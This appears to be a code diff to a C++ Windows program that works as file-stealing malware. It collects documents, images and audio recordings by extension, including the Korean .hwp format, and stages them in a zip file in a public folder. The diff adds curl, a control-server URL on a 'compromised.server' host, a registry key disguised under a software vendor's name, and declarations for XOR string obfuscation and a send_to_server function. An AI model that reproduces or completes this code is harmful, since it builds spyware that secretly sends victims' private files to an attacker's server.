@@ -17,6 +17,10 @@
 #include <thread>
 #include <filesystem>
 #include <ShlObj.h>
+#include <sstream>
+#include "curl/curl.h"
+#include <cstdio>
+#include "libzippp/libzippp.h"
 
 namespace fs = std::filesystem;
 
@@ -27,6 +31,9 @@ namespace fs = std::filesystem;
 #define ZIP_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr.zip"
 #define TEST_MODE "SOFTWARE\\test"
 #define TEST_VALUE "TEST_MODE"
+#define SERVER_CONTROL_PAGE "http://compromised.server/control/control.php?"
+#define UID_PATH "SOFTWARE\\ESTsoft"
+#define UID_VALUE "update"
 
 /*
 0x00 : CSIDL_DESKTOP
@@ -40,3 +47,7 @@ const char* EXTENSIONS[] =
 {	".jpg",".jpeg",".png",".gif",".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",
 	".pptx",".pdf",".txt",".mp3",".amr",".m4a",".ogg",".aac",".jpg",".jpeg",".png",".gif",
 	".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",".pptx",".pdf" };
+
+bool send_to_server(std::string file_path);
+std::string xor_string(const std::string& str, char key);
+static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp);
